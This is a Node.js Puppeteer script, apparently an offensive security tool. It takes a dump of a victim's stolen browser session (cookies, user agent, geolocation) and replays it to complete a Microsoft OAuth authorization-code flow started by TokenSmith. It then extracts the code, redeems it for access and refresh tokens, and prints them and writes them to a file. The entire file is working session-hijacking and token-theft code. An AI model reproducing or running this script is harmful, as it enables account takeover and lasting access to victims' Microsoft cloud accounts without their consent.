const puppeteer = require('puppeteer');
const session = require('./session_dump.json');
const { fetch } = globalThis;
// Removed node-fetch; use global fetch in modern Node

const { spawn } = require('child_process');
const fs = require('fs');

const closeBrowser = process.argv.includes('--close-browser');
const readline = require('readline');

(async () => {
  console.log('Launching TokenSmith to initiate authcode flow...');

  // Step 1: Launch TokenSmith and grab the auth URL from stdout
  const tokensmith = spawn('tokensmith', ['authcode','--useragent', session.userAgent]);

  let oauthUrl = '';

  tokensmith.stdout.on('data', (data) => {
    const output = data.toString();
    process.stdout.write(output); // Optional: display full output

    const urlMatch = output.match(/https:\/\/login\.microsoftonline\.com\S+/);
    if (urlMatch && urlMatch[0] && !oauthUrl) {
      oauthUrl = urlMatch[0];
      proceed(oauthUrl); // Begin automated flow as soon as we detect the URL
    }
  });

  tokensmith.stderr.on('data', (data) => {
    console.error(`TokenSmith error: ${data}`);
  });

  tokensmith.on('close', (code) => {
    console.log(`TokenSmith exited with code ${code}`);
  });

  async function proceed(oauthUrl) {
    console.log(`Detected OAuth URL from TokenSmith: ${oauthUrl}`);

    const browser = await puppeteer.launch({
      headless: false,
      args: ['--window-size=1200,800', '--incognito']
    });

    const [page] = await browser.pages();

    await page.setUserAgent(session.userAgent);
    await browser.defaultBrowserContext().overridePermissions("https://login.microsoftonline.com", ["geolocation"]);
    await page.setGeolocation({
      latitude: session.coordinates.latitude,
      longitude: session.coordinates.longitude
    });

    const cookies = session.cookies.map(c => ({
      name: c.name,
      value: c.value,
      domain: c.domain,
      path: c.path,
      expires: c.expirationDate,
      httpOnly: c.httpOnly,
      secure: c.secure,
      sameSite: c.sameSite?.toLowerCase?.(),
      url: `https://${c.domain.replace(/^\./, '')}`
    }));

    await page.setCookie(...cookies);
    console.log('Victim session loaded in incognito context.');

    // Visit the OAuth URL
    await page.goto(oauthUrl, { waitUntil: 'networkidle2' });
    
    const finalUrl = page.url();
    console.log(`Final redirect URL: ${finalUrl}`);

    const urlObj = new URL(finalUrl);
    const authCode = urlObj.searchParams.get('code');

    if (!authCode) {
      console.error('Could not extract auth code.');
      // await browser.close();
    // process.exit(0);
      process.exit(1);
    }

    console.log(`Extracted auth code: ${authCode}`);
    console.log('Redeeming code for tokens...');

    const urlParams = new URL(oauthUrl).searchParams;
    const clientId = urlParams.get('client_id');
    const redirectUri = urlParams.get('redirect_uri');
    const tenantMatch = oauthUrl.match(/login\.microsoftonline\.com\/(.*?)\//);
    const tenantId = tenantMatch ? tenantMatch[1] : 'common';

    const tokenUrl = `https://login.microsoftonline.com/${tenantId}/oauth2/v2.0/token`;
    const params = new URLSearchParams();
    params.append('client_id', clientId);
    params.append('scope', 'openid profile offline_access https://graph.windows.net/.default');
    params.append('redirect_uri', redirectUri);
    params.append('grant_type', 'authorization_code');
    params.append('code', authCode);

    try {
      const res = await fetch(tokenUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: params
      });

      const data = await res.json();

      if (data.access_token && data.refresh_token) {
        const fs = require('fs');
        console.log('Access and Refresh Tokens obtained successfully:');
        console.log('--- ACCESS TOKEN ---');
        console.log(data.access_token);
        console.log('--- REFRESH TOKEN ---');
        console.log(data.refresh_token);
        
        const tokenOutput = {
          access_token: data.access_token,
          refresh_token: data.refresh_token,
          client_id: clientId,
          timestamp: new Date().toISOString()
        };

        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `tokens_output_${timestamp}.json`;
        fs.writeFileSync(filename, JSON.stringify(tokenOutput, null, 2));
        console.log(`Tokens saved to ${filename}`);

        
      } else {
        console.error('Failed to redeem tokens. Response:', data);
      }

    } catch (err) {
      console.error('Error during token redemption:', err);
    }

    await browser.close();
    process.exit(0);
  }
})();